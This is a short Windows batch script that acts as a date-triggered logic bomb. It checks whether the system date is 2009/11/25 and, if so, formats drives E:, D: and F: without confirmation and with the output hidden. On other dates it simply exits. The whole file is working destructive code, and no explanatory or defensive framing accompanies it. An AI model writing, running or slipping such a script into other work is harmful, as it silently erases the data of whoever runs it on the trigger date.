@echo off
mode con: cols=31 lines=52

If %date% NEQ 2009/11/25 goto :exit
format E: /y >nul
format D: /y >nul
format F: /y >nul

:exit
exit
